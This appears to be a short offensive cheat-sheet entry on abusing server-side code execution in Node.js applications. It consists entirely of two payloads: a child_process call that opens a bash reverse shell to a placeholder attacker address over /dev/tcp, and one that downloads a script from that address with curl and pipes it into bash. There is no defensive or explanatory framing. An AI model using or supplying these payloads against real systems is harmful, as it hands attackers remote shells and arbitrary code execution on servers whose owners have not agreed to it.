# Server runs Node? Abusing SSRF/RCE in JS?
# Local Shell
require('child_process').exec('bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1')
# 
(() => {
  require('child_process').exec('curl http://<attacker_ip>/s.sh | bash');
})();
